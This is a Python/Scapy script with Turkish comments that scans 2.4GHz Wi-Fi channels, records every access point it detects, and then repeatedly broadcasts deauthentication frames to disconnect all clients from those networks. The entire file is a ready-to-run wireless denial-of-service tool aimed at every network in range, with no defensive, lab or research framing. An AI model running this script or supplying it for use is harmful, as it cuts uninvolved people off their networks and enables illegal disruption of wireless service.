#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth
import os
import time
import threading

# AYARLAR
interface = "wlan0mon"         
scan_time_per_channel = 2      
deauth_count = 5               
delay = 0.01                   
channels_2_4ghz = list(range(1, 14)) 


discovered_networks = []
stop_scan = False

def channel_hopper():
    while not stop_scan:
        for channel in channels_2_4ghz:
            os.system(f"iwconfig {interface} channel {channel} >/dev/null 2>&1")
            time.sleep(scan_time_per_channel)


def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        try:
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore') or "<Gizli>"
            bssid = pkt[Dot11].addr2

            channel = None
            elts = pkt.getlayer(Dot11Elt)
            while elts:
                if elts.ID == 3: 
                    channel = ord(elts.info)
                    break
                elts = elts.payload.getlayer(Dot11Elt)
            
            if channel and channel in channels_2_4ghz:
                if not any(net['bssid'] == bssid for net in discovered_networks):
                    discovered_networks.append({
                        'ssid': ssid,
                        'bssid': bssid,
                        'channel': channel
                    })
                    print(f"[+] Bulundu: {ssid[:20]}... ({bssid}) Kanal {channel}")
        except Exception as e:
            pass  


def launch_deauth_attack():
    global stop_scan
    stop_scan = True  
    
    if not discovered_networks:
        print("[-] Saldırı için 2.4GHz ağı bulunamadı!")
        return
    
    print("\n[!] 2.4GHz DEAUTH SALDIRISI BAŞLIYOR (Ctrl+C ile durdur)...")
    
    try:
        while True:
            for network in discovered_networks:
                try:
                    current_channel = network['channel']
                    os.system(f"iwconfig {interface} channel {current_channel} >/dev/null 2>&1")
                    
                    pkt = RadioTap() / Dot11(
                        addr1="ff:ff:ff:ff:ff:ff",
                        addr2=network['bssid'],
                        addr3=network['bssid']
                    ) / Dot11Deauth(reason=7)  
                    
                    sendp(pkt, iface=interface, count=deauth_count, inter=delay, verbose=0)
                    print(f"[*] Gönderim: {network['ssid'][:15]}... (Kanal {current_channel})")
                    
                except Exception as e:
                    print(f"[-] Hata (Kanal {network['channel']}): {str(e)}")
            
            time.sleep(1)  
            
    except KeyboardInterrupt:
        print("\n[!] Saldırı durduruldu")

if __name__ == "__main__":

    if not os.path.exists(f"/sys/class/net/{interface}"):
        print(f"[-] {interface} arayüzü bulunamadı!")
        print("[*] Monitor mod için: sudo airmon-ng start wlan0")
        exit(1)

    print("[+] 2.4GHz AĞ TARAMASI BAŞLATILIYOR...")
    print(f"[*] Kanal başına tarama süresi: {scan_time_per_channel}s")

    hopping_thread = threading.Thread(target=channel_hopper)
    hopping_thread.daemon = True
    hopping_thread.start()

    sniff(iface=interface, prn=packet_handler, store=0)

    launch_deauth_attack()
